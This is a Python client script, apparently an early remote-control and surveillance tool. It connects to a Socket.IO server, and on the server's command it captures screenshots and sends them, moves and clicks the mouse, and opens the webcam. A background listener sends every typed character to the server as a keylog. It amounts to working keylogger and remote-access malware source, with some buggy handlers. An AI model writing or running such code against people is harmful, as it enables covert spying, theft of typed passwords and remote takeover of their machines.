
# DEBUGGER
import logging
logging.getLogger('socketIO-client').setLevel(logging.DEBUG)
logging.basicConfig()

import io
import base64
import threading
import pyscreenshot as ImageGrab
import json
import cv2 # camera

from socketIO_client_nexus import SocketIO, LoggingNamespace
from pynput import keyboard
from pynput.mouse import Button, Controller





# connect with server...
# socketIO = SocketIO('10.128.122.101', 3000, LoggingNamespace)
socketIO = SocketIO('localhost', 3000, LoggingNamespace)
mouse = Controller()

###################### screen events ######################
def screenshot(*args):
    buffer = io.BytesIO()

    im=ImageGrab.grab()
    #im=ImageGrab.grab(bbox=(10,10,110,110))
    im.save(buffer, format = "PNG")
    im.close()

    base64_str = base64.b64encode(buffer.getvalue())

    socketIO.emit('screenshot_taken', {'image': base64_str.decode('ascii')} )

###########################################################
###################### camera events ######################

def run_camera():
    cap = cv2.VideoCapture(0)

    while(True):

        # Capture frame-by-frame
        ret, frame = cap.read()

        # Our operations on the frame come here
        gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)

        # Display the resulting frame
        cv2.imshow('frame',gray)

        if cv2.waitKey(1) & 0xFF == ord('q'):   # close window
            break

    # When everything done, release the capture
    cap.release()
    cv2.destroyAllWindows()

###########################################################
####################### mouse events ######################

def mouse_control(*args):
    
    x = args[0].get("x")
    y = args[0].get("y")

    # Set pointer position
    mouse.position = (x, y)

def mouse_left_click(*args):
    # Press and release
    mouse.press(Button.left)
    mouse.release(Button.left)

def mouse_right_click(*args):
    mouse.press(Button.right)
    mouse.release(button.right)

def mouse_double_click(*args):
    mouse.click(Button.left, 2)

###########################################################
##################### keyboard events #####################

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
        socketIO.emit('keyLog', {'key': key.char })

        
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def keyboard_list():
    print("keyboard thread started")

    # Collect events until released
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()

###########################################################

def server_list():
    
    # server events...
    def response(*args):
        print('responseMsg', args)
        
    # TODO: make reconnect 
    def on_reconnect(*args):
        print(args)

    def on_connect():
        print('connect')

    def on_init(*args):
        socketIO.emit('message', {'Hello': 'you again'})
    
    print("server thread started")
    
    #socketIO.emit('message', {'Hello': 'you'})    # wysyla to do serveru message: text
    socketIO.on('init', on_init)
    socketIO.on('screenshot', screenshot)
    socketIO.on('mouse', mouse_control)
    socketIO.on('mouseLeftClick', mouse_left_click)
    socketIO.on('runCamera', run_camera)
    
    
    # Listen
    socketIO.on('responseMsg', response)
    socketIO.wait()


# sudo touch /private/var/db/.AccessibilityAPIEnabled
# sudo rm /private/var/db/.AccessibilityAPIEnabled

server = threading.Thread(name='server_listener', target=server_list)
key = threading.Thread(name='key_listener', target=keyboard_list)

server.start()
key.start()







